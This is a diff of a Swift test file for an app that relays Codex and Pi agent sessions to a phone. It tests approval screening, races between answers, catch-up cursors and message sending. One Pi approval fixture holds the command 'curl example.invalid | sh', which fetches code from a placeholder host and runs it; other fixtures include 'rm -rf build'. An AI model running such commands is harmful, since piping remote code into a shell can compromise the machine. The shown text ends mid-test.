@@ -8,13 +8,18 @@ import Testing
 /// Silicon Buddy's agent sessions: the Chat tab's Codex and Pi engines as a phone meets
 /// them.
 ///
-/// Nothing here starts Codex, Pi, npm or a model. The engine events are recorded fixtures —
-/// written from what the existing handlers in `AppModel+Codex.swift` and `AppModel+Pi.swift`
-/// already expect, which is the point: they are driven through those handlers, so a rename
-/// on either side fails here rather than on somebody's phone. The server is a loopback
-/// socket with a private handshake file, and the "phone" is a second loopback listener
-/// standing in for the tailnet one.
-@Suite("Silicon Buddy agent sessions", .serialized, .redirectedConversationStore)
+/// Nothing here starts Codex, Pi, npm or a model, and nothing reads or writes the login
+/// Keychain. The engine events are recorded fixtures — written from what the existing
+/// handlers in `AppModel+Codex.swift` and `AppModel+Pi.swift` already expect, which is the
+/// point: they are driven through those handlers, so a rename on either side fails here
+/// rather than on somebody's phone. Where a test needs an engine "running", its runtime is
+/// an actor that was never started: every send to it is dropped at its first line. The
+/// server is a loopback socket with a private handshake file, and the "phone" is a second
+/// loopback listener standing in for the tailnet one.
+@Suite(
+    "Silicon Buddy agent sessions", .serialized, .redirectedConversationStore,
+    .hermeticAgentSeams
+)
 @MainActor
 struct BuddyAgentSessionTests {
 
@@ -28,9 +33,8 @@ struct BuddyAgentSessionTests {
     /// `handleCodexEvent` rather than through a second copy of the mapping is what makes
     /// this a test of the app rather than of the test.
     @Test func codexNotificationsBecomeOneNormalisedTranscript() throws {
-        let model = AppModel(settings: .init())
-        BuddyAgentSessions.shared.forget(model)
-        model.codexState = .ready(endpoint: URL(string: "codex://app-server")!)
+        let model = Self.freshModel()
+        Self.run(codex: model)
 
         for (method, params) in Self.codexTurn {
             model.handleCodexEvent(.notification(method: method, params: try Self.json(params)))
@@ -72,8 +76,7 @@ struct BuddyAgentSessionTests {
     /// The same thing from the other engine, whose events look nothing alike on the wire
     /// and have to look identical afterwards.
     @Test func piEventsBecomeTheSameShape() throws {
-        let model = AppModel(settings: .init())
-        BuddyAgentSessions.shared.forget(model)
+        let model = Self.freshModel()
         model.piState = .ready
 
         for event in Self.piTurn {
@@ -102,42 +105,79 @@ struct BuddyAgentSessionTests {
         #expect(rows.allSatisfy { $0.status != "running" })
     }
 
-    /// Both engines' approvals, side by side on the wire.
+    /// A log is sampled ten times a second, so what travels is its tail — and it says so.
+    @Test func aLongOutputTravelsAsItsTailAndSaysSo() throws {
+        let limit = ControlAPI.agentOutputLimit
+        let log = String(repeating: "compiling…\n", count: limit) + "error: the last line"
+        let row = AppModel.agentRow(codex: CodexChatItem(
+            id: "c1", kind: .command(command: "swift build", output: log, running: false)
+        ))
+        #expect(row.truncated == true)
+        #expect(row.output?.count == limit)
+        // The end, which is where a build says what went wrong.
+        #expect(row.output?.hasSuffix("error: the last line") == true)
+
+        // Exactly at the limit nothing is cut, and nothing claims to have been.
+        let exact = String(repeating: "x", count: limit)
+        let whole = AppModel.agentRow(codex: CodexChatItem(
+            id: "c2", kind: .command(command: "ls", output: exact, running: false)
+        ))
+        #expect(whole.truncated == nil)
+        #expect(whole.output == exact)
+        // Multi-byte text is cut by characters, not bytes: never half a character.
+        let wide = String(repeating: "é", count: limit + 10)
+        let cut = AppModel.agentRow(codex: CodexChatItem(
+            id: "c3", kind: .command(command: "cat", output: wide, running: false)
+        ))
+        #expect(cut.output?.count == limit)
+        #expect(cut.truncated == true)
+    }
+
+    // MARK: - Approvals, and the screening window
+
+    /// Both engines' approvals, side by side on the wire — each one carrying what the Mac's
+    /// own card says about it.
     ///
-    /// Injected rather than driven through the guardrail on purpose: a screening asks
-    /// `JevService.shared`, and a unit test must not depend on whether the person running
-    /// it has TypeSafe switched on. What is under test here is the mapping and the wire
-    /// shape, which is the part Silicon Buddy owns.
+    /// Screenings are injected rather than run: a real one asks `JevService.shared`, and a
+    /// unit test must not depend on whether the person running it has TypeSafe switched
+    /// on. What is under test is the mapping and the gate, which is the part Silicon Buddy
+    /// owns.
     @Test func approvalsFromBothEnginesLookAlikeOnTheWire() async throws {
-        let model = AppModel(settings: .init())
-        BuddyAgentSessions.shared.forget(model)
-        model.codexState = .ready(endpoint: URL(string: "codex://app-server")!)
+        let model = Self.freshModel()
+        Self.run(codex: model)
         model.piState = .ready
 
         model.codexApprovals = [
             CodexApproval(
                 rpcID: .number(7), kind: .command("rm -rf build"),
-                reason: "Codex asks before running a command in this folder."
+                reason: "Codex asks before running a command in this folder.",
+                screening: Self.unscreened
             ),
-            CodexApproval(rpcID: .number(8), kind: .fileChange("Sources/Lisbon/Itinerary.swift")),
-        ]
-        model.piItems = [
-            AppModel.PiItem(
-                kind: .approval(requestID: "ui-1", tool: "bash"),
-                text: #"{"command":"swift test"}"#, running: true
+            // A screening that failed on the network: its reason is an error's description,
+            // and it does not travel.
+            CodexApproval(
+                rpcID: .number(8), kind: .fileChange("Sources/Lisbon/Itinerary.swift"),
+                screening: .unavailable(reason: "Could not connect to api.example.invalid")
             ),
         ]
+        model.piItems = [Self.screenedPiCard(#"{"command":"swift test"}"#)]
 
-        let codex = try await model.agentSession(engine: "codex", since: nil)
+        let codex = try await model.agentSession(engine: "codex", query: .init())
         #expect(codex.approvals.map(\.kind) == ["command", "fileChange"])
         #expect(codex.approvals[0].summary == "rm -rf build")
         #expect(codex.approvals[0].reason?.isEmpty == false)
+        #expect(codex.approvals[0].screening == ControlAPI.AgentScreening(
+            verdict: "unavailable",
+            summary: "Jev: not screened — Guardrails are off in Settings → TypeSafe (Jev)."
+        ))
+        #expect(codex.approvals[1].screening.verdict == "unavailable")
+        #expect(!codex.approvals[1].screening.summary.contains("example.invalid"))
         // Codex sometimes says why; Pi's gate is this app's own extension and never does,
         // so the field is absent rather than filled with a sentence nobody said.
         #expect(codex.approvals[1].reason == nil)
         #expect(codex.session.pendingApprovals == 2)
 
-        let pi = try await model.agentSession(engine: "pi", since: nil)
+        let pi = try await model.agentSession(engine: "pi", query: .init())
         #expect(pi.approvals.map(\.kind) == ["tool"])
         #expect(pi.approvals[0].summary == #"bash {"command":"swift test"}"#)
         // The held call is in the transcript too, saying it is waiting — which is what the
@@ -147,34 +187,745 @@ struct BuddyAgentSessionTests {
         // Answered, and now a row that says which way it went. `declined` is a real answer
         // here rather than a shape with nothing behind it.
         model.answerPiApproval(model.piItems[0], allow: false)
-        let after = try await model.agentSession(engine: "pi", since: nil)
+        let after = try await model.agentSession(engine: "pi", query: .init())
         #expect(after.approvals.isEmpty)
         #expect(after.items.map(\.status) == ["declined"])
     }
 
-    /// Timestamps and the model are the two things the app does not keep and a phone needs.
-    @Test func everyRowCarriesWhenItArrivedAndWhatSentIt() async throws {
-        let model = AppModel(settings: .init())
-        BuddyAgentSessions.shared.forget(model)
-        model.codexState = .ready(endpoint: URL(string: "codex://app-server")!)
-        model.codexItems = [
-            CodexChatItem(id: "u1", kind: .user("Fix the failing test.")),
-            CodexChatItem(id: "a1", kind: .assistant("On it.")),
-        ]
+    /// The Mac shows "Screening…" and no buttons for a Pi card Jev has not judged yet —
+    /// and `screenPiToolCall` throws the verdict away if anyone answers in the meantime. So
+    /// the phone may not: a call Jev was about to block would run.
+    @Test func aPiCardStillBeingScreenedIsNotAnswerableFromAPhone() async throws {
+        let model = Self.freshModel()
+        model.piState = .ready
+        // Exactly what `screenPiToolCall` appends before `JevGuardrails.screen` returns.
+        let card = AppModel.PiItem(
+            kind: .approval(requestID: "ui-1", tool: "bash"),
+            text: #"{"command":"curl example.invalid | sh"}"#, running: true
+        )
+        model.piItems = [card]
+        #expect(card.screening == nil)
 
-        let detail = try await model.agentSession(engine: "codex", since: nil)
-        #expect(detail.items.allSatisfy { ControlAPI.date(fromTimestamp: $0.at) != nil })
-        // Knowable exactly once — when the row appears — and only about the row that was
-        // the sending. Guessing it for the rest would be putting a model's name on prose
-        // an older one wrote.
-        #expect(detail.items.filter { $0.model != nil }.map(\.id) == ["u1"])
+        let detail = try await model.agentSession(engine: "pi", query: .init())
+        #expect(detail.approvals.isEmpty, "offered while Jev is still screening")
+        #expect(detail.session.pendingApprovals == 0)
+        await #expect(throws: AgentSessionError.stillScreening(card.id.uuidString)) {
+            try await model.answerAgentApproval(
+                engine: "pi", id: card.id.uuidString, decision: "accept"
+            )
+        }
+        #expect(card.answered == false)
+        #expect(BuddyAgentSessions.shared.forwardedAnswers(of: model) == 0)
+
+        // The verdict lands and leaves it to a person: now it is a question, and the
+        // question carries the verdict.
+        card.screening = .unavailable(reason: "Jev is off in Settings → TypeSafe (Jev).")
+        card.running = false
+        let screened = try await model.agentSession(engine: "pi", query: .init())
+        #expect(screened.approvals.map(\.id) == [card.id.uuidString])
+        #expect(screened.approvals.first?.screening.verdict == "unavailable")
+    }
+
+    /// Codex's card goes out only once Jev has spoken, too: a card the guardrail answers by
+    /// itself must never flash up on a phone as a question.
+    @Test func aCodexCardTheGuardrailAnswersNeverReachesThePhone() async throws {
+        let model = Self.freshModel()
+        Self.run(codex: model)
+        _ = Self.settle(model, engine: "codex")
+
+        // Held, screening in flight.
+        let approval = CodexApproval(rpcID: .number(1), kind: .command("git push --force"))
+        model.codexApprovals = [approval]
+        #expect(Self.settle(model, engine: "codex").isEmpty)
+        let id = approval.id.uuidString
+        await #expect(throws: AgentSessionError.stillScreening(id)) {
+            try await model.answerAgentApproval(engine: "codex", id: id, decision: "accept")
+        }
+
+        // Jev blocks it and, armed, answers it — the card goes without ever being asked.
+        model.answerCodexApproval(approval, accept: false)
+        #expect(Self.settle(model, engine: "codex").isEmpty)
+        #expect(BuddyAgentSessions.shared.forwardedAnswers(of: model) == 0)
+    }
+
+    /// A stopped engine is asking nobody anything. Pi keeps its cards in the transcript
+    /// after `stopPi`, and "answering" one would report `accepted` with nothing sent.
+    @Test func aStoppedEngineOffersNoApprovals() async throws {
+        let model = Self.freshModel()
+        model.piState = .ready
+        let card = Self.screenedPiCard("{}")
+        model.piItems = [card]
+        #expect(try await model.agentSession(engine: "pi", query: .init()).approvals.count == 1)
+
+        model.stopPi()
+        let pi = try #require(await model.agentSessions().sessions.first { $0.engine == "pi" })
+        #expect(pi.state == "stopped")
+        #expect(pi.pendingApprovals == 0, "stopped engine reports \(pi.pendingApprovals) pending")
+        await #expect(throws: AgentSessionError.notRunning("pi")) {
+            try await model.answerAgentApproval(
+                engine: "pi", id: card.id.uuidString, decision: "accept"
+            )
+        }
+        #expect(card.answered == false)
+        #expect(BuddyAgentSessions.shared.forwardedAnswers(of: model) == 0)
+    }
+
+    // MARK: - The race
+
+    /// The one that matters: the owner answers an approval at the Mac, the phone's tap is
+    /// already in flight, and the runtime must be told exactly once.
+    ///
+    /// `forwardedAnswers` counts every time a device's answer is forwarded to a runtime —
+    /// `CodexRuntime.respond`, or Pi's `extension_ui_response` — at the moment it is, and
+    /// `answerAgentApproval` is the only path a device has to either. A change that let
+    /// the second answer through moves that number, and this fails.
+    @Test func anApprovalAnsweredAtTheMacIsNeverForwardedTwice() async throws {
+        let model = Self.freshModel()
+        Self.run(codex: model)
+        let approval = CodexApproval(
+            rpcID: .number(7), kind: .command("rm -rf build"), screening: Self.unscreened
+        )
+        model.codexApprovals = [approval]
+
+        // The phone has seen the card and is about to answer it.
+        let waiting = try await model.agentSession(engine: "codex", query: .init())
+        #expect(waiting.approvals.map(\.id) == [approval.id.uuidString])
+
+        // The owner gets there first.
+        model.answerCodexApproval(approval, accept: true)
+        #expect(model.codexApprovals.isEmpty)
+
+        await #expect(throws: AgentSessionError.answeredOnTheMac(approval.id.uuidString)) {
+            try await model.answerAgentApproval(
+                engine: "codex", id: approval.id.uuidString, decision: "decline"
+            )
+        }
+        // Nothing was sent. Not "sent and ignored" — not sent.
+        #expect(BuddyAgentSessions.shared.forwardedAnswers(of: model) == 0)
+    }
+
+    /// The other way round, and the second tap after it.
+    @Test func aPhonesAnswerIsForwardedOnceAndThenTheCardIsGone() async throws {
+        let model = Self.freshModel()
+        Self.run(codex: model)
+        let approval = CodexApproval(
+            rpcID: .number(7), kind: .command("swift test"), screening: Self.unscreened
+        )
+        model.codexApprovals = [approval]
+        let id = approval.id.uuidString
+
+        let answered = try await model.answerAgentApproval(
+            engine: "codex", id: id, decision: "accept"
+        )
+        #expect(answered.decision == "accepted")
+        #expect(answered.session.pendingApprovals == 0)
+        #expect(BuddyAgentSessions.shared.forwardedAnswers(of: model) == 1)
+        // The card goes at once, on the Mac as well: a decision has been made, and a card
+        // still on screen would be a lie about what is still pending.
+        #expect(model.codexApprovals.isEmpty)
+
+        // A second tap — a retry on a bad connection, a stale screen. Not 409: the Mac did
+        // not answer this, the last request did, and nothing else was decided here.
+        await #expect(throws: AgentSessionError.unknownApproval(id)) {
+            try await model.answerAgentApproval(engine: "codex", id: id, decision: "accept")
+        }
+        #expect(BuddyAgentSessions.shared.forwardedAnswers(of: model) == 1)
+
+        // A decision that is not one never reaches the approval at all.
+        await #expect(throws: AgentSessionError.unknownDecision("maybe")) {
+            try await model.answerAgentApproval(engine: "codex", id: id, decision: "maybe")
+        }
+        #expect(BuddyAgentSessions.shared.forwardedAnswers(of: model) == 1)
+    }
+
+    /// Two full-control phones tap at once: one forward, and one refusal.
+    @Test func twoPhonesAtOnceForwardOnce() async throws {
+        let model = Self.freshModel()
+        Self.run(codex: model)
+        let approval = CodexApproval(
+            rpcID: .number(3), kind: .command("ls"), screening: Self.unscreened
+        )
+        model.codexApprovals = [approval]
+        let id = approval.id.uuidString
+        async let one = try? model.answerAgentApproval(engine: "codex", id: id, decision: "accept")
+        async let two = try? model.answerAgentApproval(engine: "codex", id: id, decision: "decline")
+        let results = await [one, two]
+        #expect(results.compactMap { $0 }.count == 1)
+        #expect(BuddyAgentSessions.shared.forwardedAnswers(of: model) == 1)
+    }
+
+    /// A card that goes away without anybody answering it — a stopped engine, a restart, a
+    /// sidecar that died. Nothing will run, so the phone's card comes down saying
+    /// `declined`; but nobody answered first, so a tap that lands afterwards is a 404 and
+    /// not a 409 about a decision that was never made.
+    @Test func anApprovalTheEngineTookWithItIsGoneRatherThanAnswered() async throws {
+        let model = Self.freshModel()
+        Self.run(codex: model)
+        let approval = CodexApproval(
+            rpcID: .number(9), kind: .command("swift build"), screening: Self.unscreened
+        )
+        _ = Self.settle(model, engine: "codex")
+        model.codexApprovals = [approval]
+        let id = approval.id.uuidString
+        _ = Self.settle(model, engine: "codex")
+
+        // What `handleCodexEvent(.terminated)` does when the sidecar exits under a turn.
+        model.codexApprovals.removeAll()
+        #expect(Self.states(Self.settle(model, engine: "codex")) == ["declined"])
+
+        await #expect(throws: AgentSessionError.unknownApproval(id)) {
+            try await model.answerAgentApproval(engine: "codex", id: id, decision: "accept")
+        }
+        #expect(BuddyAgentSessions.shared.forwardedAnswers(of: model) == 0)
+    }
+
+    /// Pi's half of the same rule. Its cards stay in the transcript once answered, so the
+    /// race is detected differently and has to come out the same.
+    @Test func piApprovalsFollowTheSameRule() async throws {
+        let model = Self.freshModel()
+        model.piState = .ready
+        let card = Self.screenedPiCard(#"{"command":"rm -rf build"}"#)
+        model.piItems = [card]
+        let id = card.id.uuidString
+
+        _ = try await model.agentSession(engine: "pi", query: .init())
+        model.answerPiApproval(card, allow: false)
+
+        await #expect(throws: AgentSessionError.answeredOnTheMac(id)) {
+            try await model.answerAgentApproval(engine: "pi", id: id, decision: "accept")
+        }
+        #expect(BuddyAgentSessions.shared.forwardedAnswers(of: model) == 0)
+    }
+
+    // MARK: - Catching up
+
+    /// A phone that lost its stream asks for what it missed with the cursor it has, and
+    /// gets that and nothing else.
+    @Test func sinceHandsBackOnlyWhatAPhoneHasNotSeen() async throws {
+        let model = Self.freshModel()
+        Self.run(codex: model)
+        model.codexItems = [CodexChatItem(id: "a1", kind: .assistant("First."))]
+
+        let first = try await model.agentSession(engine: "codex", query: .init())
+        #expect(first.items.map(\.id) == ["a1"])
+        #expect(first.complete)
+        #expect(first.epoch == first.session.epoch)
+
+        model.codexItems.append(CodexChatItem(id: "a2", kind: .assistant("Second.")))
+        let caught = try await model.agentSession(
+            engine: "codex", query: .init(since: first.seq, epoch: first.epoch)
+        )
+        #expect(caught.items.map(\.id) == ["a2"])
+        #expect(caught.complete == false)
+        #expect(caught.seq > first.seq)
+
+        // A row that changes is newer again — text that grew while the phone was away is
+        // not "already seen" because its id is.
+        model.codexItems[0].kind = .assistant("First, revised.")
+        let revised = try await model.agentSession(
+            engine: "codex", query: .init(since: caught.seq, epoch: caught.epoch)
+        )
+        #expect(revised.items.map(\.id) == ["a1"])
+        #expect(revised.items.first?.text == "First, revised.")
+
+        // Nothing moved since: an empty slice, not the transcript again.
+        let quiet = try await model.agentSession(
+            engine: "codex", query: .init(since: revised.seq, epoch: revised.epoch)
+        )
+        #expect(quiet.items.isEmpty)
+        #expect(quiet.complete == false)
+
+        // A cursor with half missing, from nowhere this session has been, or from another
+        // transcript: each is a caller asking to continue from somewhere that does not
+        // exist, and the honest answer is the whole transcript, said so by `complete`.
+        for query in [
+            ControlAPI.AgentSessionQuery(since: revised.seq),
+            ControlAPI.AgentSessionQuery(since: 99_999, epoch: revised.epoch),
+            ControlAPI.AgentSessionQuery(since: -4, epoch: revised.epoch),
+            ControlAPI.AgentSessionQuery(since: revised.seq, epoch: "some-other-epoch"),
+        ] {
+            let whole = try await model.agentSession(engine: "codex", query: query)
+            #expect(whole.items.map(\.id) == ["a1", "a2"], "\(query)")
+            #expect(whole.complete, "\(query)")
+        }
+
+        // And a new thread is the same situation: what came before cannot be caught up,
+        // only replaced — and the epoch says it is a different transcript.
+        let beforeTheNewThread = try await model.agentSession(engine: "codex", query: .init())
+        model.newCodexThread()
+        model.codexItems = [CodexChatItem(id: "b1", kind: .assistant("Fresh."))]
+        let afterwards = try await model.agentSession(
+            engine: "codex",
+            query: .init(since: beforeTheNewThread.seq, epoch: beforeTheNewThread.epoch)
+        )
+        #expect(afterwards.items.map(\.id) == ["b1"])
+        #expect(afterwards.complete)
+        #expect(afterwards.epoch != beforeTheNewThread.epoch)
+    }
+
+    /// seq restarts with the ledger. A cursor from before the Mac's app relaunched must not
+    /// be accepted as a slice of a different transcript.
+    @Test func aCursorFromAPreviousRunIsNotAcceptedAsASlice() async throws {
+        let before = Self.freshModel()
+        Self.run(codex: before)
+        before.codexItems = (1...3).map { CodexChatItem(id: "a\($0)", kind: .assistant("a\($0)")) }
+        let old = try await before.agentSession(engine: "codex", query: .init())
+
+        let after = Self.freshModel()
+        Self.run(codex: after)
+        after.codexItems = (1...6).map { CodexChatItem(id: "b\($0)", kind: .assistant("b\($0)")) }
+        let resumed = try await after.agentSession(
+            engine: "codex", query: .init(since: old.seq, epoch: old.epoch)
+        )
+        #expect(resumed.complete, "stale cursor answered as slice \(resumed.items.map(\.id))")
+        #expect(resumed.items.count == 6)
+    }
+
+    /// Frames go out in seq order, so a phone resuming from the last frame it read has read
+    /// everything below it. Rows carry the seq they were given when first seen to change,
+    /// which can be earlier than a frame made now — so this is not automatic.
+    @Test func resumingFromTheLastFrameSeenLosesNothing() async throws {
+        let model = Self.freshModel()
+        Self.run(codex: model)
+        model.codexItems = [
+            CodexChatItem(id: "A", kind: .assistant("a0")),
+            CodexChatItem(id: "B", kind: .assistant("b0")),
+        ]
+        _ = Self.settle(model, engine: "codex")
+        _ = Self.settle(model, engine: "codex")
+        // B grows; some phone's GET reconciles in between the watcher's readings.
+        model.codexItems[1].kind = .assistant("b1")
+        BuddyAgentSessions.shared.reconcile(try #require(model.agentSnapshot(engine: "codex")))
+        // A grows; the watcher reads.
+        model.codexItems[0].kind = .assistant("a1")
+        let tick = Self.events(Self.settle(model, engine: "codex"))
+        let seqs = tick.map(\.seq)
+        #expect(seqs == seqs.sorted(), "out of order: \(tick.map { "\($0.item?.id ?? $0.kind)@\($0.seq)" })")
+        #expect(tick.compactMap { $0.item?.id } == ["B", "A"])
+        // The link drops after the first frame; the phone resumes from it.
+        let first = try #require(tick.first)
+        let resumed = try await model.agentSession(
+            engine: "codex", query: .init(since: first.seq, epoch: first.epoch)
+        )
+        for id in tick.dropFirst().compactMap({ $0.item?.id }) {
+            #expect(resumed.items.contains { $0.id == id }, "row \(id) lost on resume")
+        }
+    }
+
+    /// A watching phone has to learn that the rows it holds belong to a thread that is
+    /// gone — and which one replaced it.
+    @Test func aNewThreadIsSignalledOnEvents() throws {
+        let model = Self.freshModel()
+        Self.run(codex: model)
+        model.codexThreadID = "th_1"
+        model.codexItems = [
+            CodexChatItem(id: "a1", kind: .assistant("old 1")),
+            CodexChatItem(id: "a2", kind: .assistant("old 2")),
+        ]
+        _ = Self.settle(model, engine: "codex")
+        _ = Self.settle(model, engine: "codex")
+        let oldEpoch = try #require(BuddyAgentSessions.shared.epoch(of: model, engine: "codex"))
+
+        model.newCodexThread()
+        model.codexItems = [CodexChatItem(id: "b1", kind: .assistant("new"))]
+        let tick = Self.events(Self.settle(model, engine: "codex"))
+        #expect(tick.map(\.kind) == ["reset", "item"])
+        let reset = try #require(tick.first)
+        #expect(reset.epoch != oldEpoch)
+        #expect(reset.threadID == nil)
+        #expect(reset.state == "running")
+        #expect(reset.turnActive == false)
+        // Every frame after it is in the new transcript.
+        #expect(tick.allSatisfy { $0.epoch == reset.epoch })
+        #expect(tick.map(\.seq) == tick.map(\.seq).sorted())
+
+        // A thread getting its id is not a new transcript; it is news about this one.
+        model.codexThreadID = "th_2"
+        let named = Self.events(Self.settle(model, engine: "codex"))
+        #expect(named.map(\.kind) == ["state"])
+        #expect(named.first?.threadID == "th_2")
+        #expect(named.first?.epoch == reset.epoch)
+    }
+
+    /// `limit`, and what a slice that would not fit becomes.
+    @Test func aLimitNeverDropsTheOldestChangesOfASlice() async throws {
+        let model = Self.freshModel()
+        Self.run(codex: model)
+        model.codexItems = (1...10).map { CodexChatItem(id: "r\($0)", kind: .assistant("\($0)")) }
+        let whole = try await model.agentSession(engine: "codex", query: .init(limit: 4))
+        // The newest rows, oldest first, and a count of what was left out.
+        #expect(whole.items.map(\.id) == ["r7", "r8", "r9", "r10"])
+        #expect(whole.omitted == 6)
+        #expect(whole.complete)
+
+        // Six rows change: more than the limit. A slice of the newest four would silently
+        // leave r1 and r2 stale on the phone — so the answer is the transcript's tail,
+        // said to be one.
+        for index in 0..<6 { model.codexItems[index].kind = .assistant("changed \(index)") }
+        let slice = try await model.agentSession(
+            engine: "codex", query: .init(since: whole.seq, epoch: whole.epoch, limit: 4)
+        )
+        #expect(slice.complete)
+        #expect(slice.items.map(\.id) == ["r7", "r8", "r9", "r10"])
+        #expect(slice.omitted == 6)
+
+        // One that fits is a slice.
+        model.codexItems[9].kind = .assistant("once more")
+        let small = try await model.agentSession(
+            engine: "codex", query: .init(since: slice.seq, epoch: slice.epoch, limit: 4)
+        )
+        #expect(small.complete == false)
+        #expect(small.items.map(\.id) == ["r10"])
+        #expect(small.omitted == 0)
+
+        // A limit out of range is clamped rather than refused.
+        let clamped = try await model.agentSession(engine: "codex", query: .init(limit: 0))
+        #expect(clamped.items.count == 1)
+    }
+
+    // MARK: - Frames
+
+    /// A model writing a hundred tokens a second must not become a hundred frames a second.
+    ///
+    /// The rule is the sampling, so this is what it looks like: the ledger is reconciled as
+    /// often as anything asks — routes do, constantly — and the watcher emits one frame per
+    /// row per reading. Twenty deltas between two readings are one frame carrying the row
+    /// whole, which is also why a phone that misses one has missed nothing.
+    @Test func streamedProseIsCoalescedIntoOneFramePerReading() throws {
+        let model = Self.freshModel()
+        Self.run(codex: model)
+        model.codexItems = [CodexChatItem(id: "a1", kind: .assistant(""))]
+
+        // The watcher's first reading is its baseline, and says nothing to anybody: a
+        // phone that connects is opened from that same reading instead.
+        #expect(Self.settle(model, engine: "codex").isEmpty)
+
+        var text = ""
+        for token in ["Start ", "in ", "Alfama, ", "early."] {
+            text += token
+            model.codexItems[0].kind = .assistant(text)
+            // Every route that touches this engine reconciles; none of them posts.
+            BuddyAgentSessions.shared.reconcile(
+                try #require(model.agentSnapshot(engine: "codex"))
+            )
+        }
+
+        let frames = Self.events(Self.settle(model, engine: "codex"))
+        #expect(frames.map(\.kind) == ["item"])
+        // The row whole, not the last delta.
+        #expect(frames.first?.item?.text == "Start in Alfama, early.")
+        #expect(frames.first?.item?.id == "a1")
+        // And the sampling rate is the promise: ten readings a second, per engine.
+        #expect(AgentEventPump.interval == .milliseconds(100))
+
+        // Nothing moved: nothing said.
+        #expect(Self.settle(model, engine: "codex").isEmpty)
+    }
+
+    /// What a phone that has just connected is told, per engine: where the session is, and
+    /// every card waiting — all at the current seq, so what follows is newer.
+    @Test func aConnectingPhoneIsOpenedWithTheSessionAsItIsNow() throws {
+        let model = Self.freshModel()
+        Self.run(codex: model)
+        model.codexThreadID = "th_9"
+        model.codexTurnActive = true
+        model.codexApprovals = [CodexApproval(
+            rpcID: .number(2), kind: .command("make"), screening: Self.unscreened
+        )]
+        let snapshot = try #require(model.agentSnapshot(engine: "codex"))
+        BuddyAgentSessions.shared.reconcile(snapshot)
+        let opening = Self.events(BuddyAgentSessions.shared.openingFrames(for: snapshot))
+        #expect(opening.map(\.kind) == ["state", "turn", "approval"])
+        #expect(opening.map(\.state) == ["running", nil, "pending"])
+        #expect(opening[1].turnActive == true)
+        #expect(Set(opening.map(\.seq)).count == 1)
+        #expect(opening.allSatisfy { $0.threadID == "th_9" && !$0.epoch.isEmpty })
+    }
+
+    /// The Mac's own doing, on the phone: the owner's send, the owner's approval, the
+    /// turn starting and ending.
+    @Test func whatTheOwnerDoesAtTheMacBecomesFramesToo() throws {
+        let model = Self.freshModel()
+        Self.run(codex: model)
+        _ = Self.settle(model, engine: "codex")
+
+        // The owner types into the Mac's own window.
+        model.codexItems.append(CodexChatItem(id: "u1", kind: .user("Fix the test.")))
+        model.codexTurnActive = true
+        let typed = Self.settle(model, engine: "codex")
+        #expect(Self.kinds(typed) == ["item", "turn"])
+
+        // Codex asks, Jev leaves it to a person, and the card appears on both screens.
+        let approval = CodexApproval(
+            rpcID: .number(7), kind: .command("swift test"), screening: Self.unscreened
+        )
+        model.codexApprovals = [approval]
+        let asked = Self.settle(model, engine: "codex")
+        #expect(Self.kinds(asked) == ["approval"])
+        #expect(Self.states(asked) == ["pending"])
+
+        // The owner answers it at the Mac. The phone's card has to go away by itself, and
+        // say which way it went — that frame is the whole of "answered on either side
+        // resolves on both".
+        model.answerCodexApproval(approval, accept: true)
+        let answered = Self.settle(model, engine: "codex")
+        #expect(Self.kinds(answered) == ["approval"])
+        #expect(Self.states(answered) == ["accepted"])
+
+        // A declined one says so too, rather than both ending as "gone".
+        let second = CodexApproval(
+            rpcID: .number(8), kind: .command("rm -rf build"), screening: Self.unscreened
+        )
+        model.codexApprovals = [second]
+        _ = Self.settle(model, engine: "codex")
+        model.answerCodexApproval(second, accept: false)
+        #expect(Self.states(Self.settle(model, engine: "codex")) == ["declined"])
+
+        // And the engine going down is one frame, not a silence a phone has to time out on.
+        model.codexTurnActive = false
+        model.codexState = .failed(message: "Codex exited unexpectedly.")
+        let died = Self.settle(model, engine: "codex")
+        #expect(Self.kinds(died) == ["state", "turn"])
+        #expect(Self.states(died) == ["failed"])
+    }
+
+    // MARK: - Sending
+
+    /// The valid-model path, all the way into the engine — with the save and the model list
+    /// stubbed, so nothing reads this Mac's disk or writes its Keychain.
+    @Test func aTurnSentWithAPickedModelIsSentWithItAndTheChoiceSticks() async throws {
+        let model = Self.freshModel()
+        Self.run(codex: model)
+        model.codexRuntime = CodexRuntime()   // never started: its sends go nowhere
+        let saves = SaveRecorder()
+
+        let accepted = try await AgentSessionSeams.$modelChoices.withValue(Self.twoModels) {
+            try await AgentSessionSeams.$saveSettings.withValue(saves.record) {
+                try await model.sendAgentMessage(
+                    engine: "codex", .init(text: "Fix the test.", model: "node/studio/qwen3.8-27b")
+                )
+            }
+        }
+        #expect(model.codexItems.first?.id == accepted.itemID)
+        // Sticky, as the Mac's own menu is: the engine's model now, and written down —
+        // through the seam, never through `Settings.save()`.
+        #expect(model.settings.codexModel == "node/studio/qwen3.8-27b")
+        #expect(saves.count >= 1)
+        #expect(saves.lastCodexModel == "node/studio/qwen3.8-27b")
+        // And stamped on the row the phone's send became.
+        let detail = try await model.agentSession(engine: "codex", query: .init())
+        #expect(detail.items.first { $0.id == accepted.itemID }?.model == "node/studio/qwen3.8-27b")
+    }
+
+    /// The Mac's send button is disabled while Codex works; a phone is refused the same.
+    /// Pi takes a message mid-turn as steering, which is what typing into it does too.
+    @Test func aCodexTurnInProgressRefusesASecondTurnButPiSteers() async throws {
+        let model = Self.freshModel()
+        Self.run(codex: model)
+        model.codexRuntime = CodexRuntime()
+        model.codexTurnActive = true
+
+        await #expect(throws: AgentSessionError.turnInProgress("codex")) {
+            try await model.sendAgentMessage(engine: "codex", .init(text: "And another thing"))
+        }
+        #expect(model.codexItems.isEmpty)
+        // The first turn's "working" state is untouched.
+        #expect(model.codexTurnActive)
+
+        model.piState = .ready
+        model.piRuntime = PiRuntime()          // never started: its sends go nowhere
+        model.piBusy = true
+        let steered = try await model.sendAgentMessage(engine: "pi", .init(text: "Also this"))
+        #expect(model.piItems.last?.id.uuidString == steered.itemID)
+    }
+
+    /// A model that is not on the list is refused before the engine is asked, rather than
+    /// a turn quietly answered by a different model than the one on screen.
+    @Test func aTurnCannotBeSentWithAModelThisSessionDoesNotHave() async throws {
+        let model = Self.freshModel()
+        Self.run(codex: model)
+
+        await #expect(throws: AgentSessionError.unknownModel("gpt-5")) {
+            try await model.sendAgentMessage(
+                engine: "codex", .init(text: "Hello", model: "gpt-5")
+            )
+        }
+        await #expect(throws: AgentSessionError.emptyMessage) {
+            try await model.sendAgentMessage(engine: "codex", .init(text: "   \n "))
+        }
+        // Nothing reached the transcript on either refusal.
+        #expect(model.codexItems.isEmpty)
+
+        // The same rule on Pi, whose model switch would otherwise write settings.
+        model.piState = .ready
